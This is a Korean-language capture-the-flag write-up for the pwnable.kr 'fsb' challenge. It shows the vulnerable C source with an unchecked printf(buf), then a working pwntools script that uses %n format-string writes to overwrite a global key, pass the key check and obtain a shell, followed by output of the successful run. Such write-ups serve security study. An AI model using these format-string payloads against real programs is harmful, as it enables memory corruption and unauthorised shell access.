# [pwnable.kr] fsb writeup



#### [summary] 

```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
	char* args[]={"/bin/sh", 0};
	int i;

	char*** pargv = &argv;
	char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
	*pargv=0;
	*penvp=0;

	for(i=0; i<4; i++){
		printf("Give me some format strings(%d)\n", i+1);
		read(0, buf, 100);
		printf(buf); //<=== vulnerable!
	}

	printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
	return 0;
}

int main(int argc, char* argv[], char** envp){

	int fd = open("/dev/urandom", O_RDONLY);
	if( fd==-1 || read(fd, &key, 8) != 8 ){
		printf("Error, tell admin\n");
		return 0;
	}
	close(fd);

	alloca(0x12345 & key);

	fsb(argv, envp); // exploit this format string bug!
	return 0;
}

```

명백하게 format string bug가 발생한다.

타겟은 다음과 같이 설정한다. `key     0x804a060 134520928`, `key+4   0x804a064 134520932` 

`format string bug`를 이용하여 key의 값을 대충 16으로 변경함으로써 주어진 조건문을 만족시키기로 했음

### exploit

```python
from pwn import *

r = process(['/home/fsb/fsb', 'cat /home/fsb/flag'])

#context.log_level = 'debug'

r.sendafter('Give me some format strings(1)\n','%134520928c%14$n')
r.sendafter('Give me some format strings(2)\n','%134520932c%15$n')
r.sendafter('Give me some format strings(3)\n','%21$n')
r.sendafter('Give me some format strings(4)\n','%c%20$n')

r.recvuntil("Wait a sec...\n")
sleep(3)
r.sendafter('key : \n','16')
r.sendline('cat /home/fsb/flag')
r.interactive()
```

솔직히 좀 아쉽게 푼 것 같다. `134520928`이 전체 다 출력되는데에 너무 오랜 시간이 걸린다. 빠르게 익스 가능한 방법을 찾아보려고 했으나 결국 찾지 못했다. ㅜ 요거도 질문 리스트임

### result

```shell
fsb@prowl:/tmp/charlie2$ python fsb.py 
[+] Starting local process '/home/fsb/fsb': pid 344678
[*] Switching to interactive mode
Congratz!
Have you ever saw an example of utilizing [n] format character?? :(
$ id
uid=1046(fsb) gid=1046(fsb) egid=1047(fsb_pwn) groups=1047(fsb_pwn),1046(fsb)
```

